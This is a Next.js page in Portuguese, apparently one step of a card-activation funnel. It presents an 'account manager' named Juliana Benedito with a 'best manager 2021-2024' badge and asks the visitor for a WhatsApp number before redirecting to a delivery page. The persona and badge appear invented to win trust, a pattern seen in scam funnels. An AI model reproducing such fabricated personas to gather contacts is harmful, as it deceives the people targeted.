"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"

export default function ManagerPage() {
  const router = useRouter()
  const [whatsapp, setWhatsapp] = useState("")
  const [isValid, setIsValid] = useState(false)

  // Função para formatar WhatsApp
  const formatWhatsApp = (value: string) => {
    const numbers = value.replace(/\D/g, "")

    if (numbers.length <= 2) {
      return `(${numbers}`
    } else if (numbers.length <= 7) {
      return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`
    } else if (numbers.length <= 11) {
      return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`
    } else {
      return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`
    }
  }

  // Função para validar WhatsApp
  const validateWhatsApp = (phone: string) => {
    const numbers = phone.replace(/\D/g, "")
    return numbers.length === 11 && (numbers.startsWith("11") || numbers.length >= 10)
  }

  const handleWhatsAppChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    const formatted = formatWhatsApp(value)
    setWhatsapp(formatted)
    setIsValid(validateWhatsApp(formatted))
  }

  const handleContinue = () => {
    if (isValid) {
      // Salvar WhatsApp no localStorage
      const cleanNumber = whatsapp.replace(/\D/g, "")
      localStorage.setItem("userWhatsApp", cleanNumber)

      // Redirecionar para delivery-method
      router.push("/delivery-method")
    }
  }

  return (
    <main className="min-h-full bg-gray-50">
      <div className="max-w-md mx-auto p-6 py-16">
        <div className="bg-white rounded-lg shadow-md p-6">
          {/* Header */}
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-gray-800 mb-3">Ótimo, quase lá!</h1>
            <p className="text-gray-600 text-sm leading-relaxed">
              Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
            </p>
          </div>

          {/* Manager Card */}
          <div className="bg-yellow-50 border-2 border-yellow-300 rounded-lg p-6 mb-6">
            <div className="text-center">
              {/* Profile Image */}
              <div className="relative w-24 h-24 mx-auto mb-4">
                <div className="w-24 h-24 rounded-full border-4 border-yellow-400 overflow-hidden">
                  <Image
                    src="/manager-profile.png"
                    alt="Gerente Juliana Benedito"
                    width={96}
                    height={96}
                    className="w-full h-full object-cover"
                  />
                </div>
              </div>

              {/* Manager Info */}
              <p className="text-gray-600 text-sm mb-1">Gerente</p>
              <h2 className="text-xl font-bold text-yellow-600 mb-3">Juliana Benedito</h2>

              {/* Badge */}
              <div className="inline-flex items-center bg-yellow-400 text-white px-3 py-1 rounded-full text-sm font-medium">
                <span className="mr-1">⭐</span>
                Melhor gerente 2021-2024
              </div>
            </div>
          </div>

          {/* WhatsApp Input */}
          <div className="mb-6">
            <div className="flex items-center border border-gray-300 rounded-lg p-3 focus-within:border-green-500 focus-within:ring-1 focus-within:ring-green-500">
              <Image src="/whatsapp-icon.png" alt="WhatsApp" width={24} height={24} className="mr-3 flex-shrink-0" />
              <input
                type="tel"
                value={whatsapp}
                onChange={handleWhatsAppChange}
                placeholder="Digite seu WhatsApp aqui"
                className="flex-1 outline-none text-gray-700 placeholder-gray-400"
                maxLength={15}
              />
            </div>
            {whatsapp && !isValid && <p className="text-red-500 text-xs mt-1">Digite um número válido com DDD</p>}
          </div>

          {/* Continue Button */}
          <button
            onClick={handleContinue}
            disabled={!isValid}
            className={`w-full py-3 px-4 rounded-lg font-medium transition-colors ${
              isValid ? "bg-gray-800 text-white hover:bg-gray-900" : "bg-gray-300 text-gray-500 cursor-not-allowed"
            }`}
          >
            Continuar
          </button>
        </div>
      </div>
    </main>
  )
}
